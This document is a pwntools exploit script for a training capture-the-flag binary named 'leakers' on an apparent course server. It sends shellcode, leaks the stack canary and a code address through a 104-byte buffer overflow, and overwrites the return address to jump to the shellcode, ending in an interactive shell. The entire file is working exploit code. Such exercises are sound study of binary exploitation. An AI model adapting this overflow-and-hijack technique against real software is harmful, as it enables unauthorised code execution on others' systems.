from pwn import *
import time
import subprocess
import sys

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 2012)
else:
	r = process("./leakers")
	gdb.attach(r, """
    #b puts
	unset env
	c
	""")

bin_shellcode = b""
command = "genbin ~/challenges/tools/shellcodes/normal.asm"
try:
	bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
	print(f"An exception occurred: {e}")
	exit(-1)
bin_shellcode = bin_shellcode + b"\x24" #one byte more to dodge \0


input("wait")
time.sleep(0.5)
r.send(bin_shellcode) #ps1
time.sleep(0.5)

r.send(b"a"*104+b"?") # I take canary
time.sleep(0.5)
r.recvuntil(b"?")
canary = b"\x00" + r.recv(7)
print("canary: ", canary.hex())

r.send(b"a"*104+b"?"*31+b"!") # I take main
time.sleep(0.5)
r.recvuntil(b"!")
main = r.recv(6) + b"\x00\x00"

ps1 = p64(u64(main) + 0x2006a0 + 0x80) # add to main  offset to got + offset to .bss

r.send(b"a"*104+canary+b"?"*8+ps1) # Code hijack
time.sleep(0.5)
r.sendline(b"")
r.interactive()
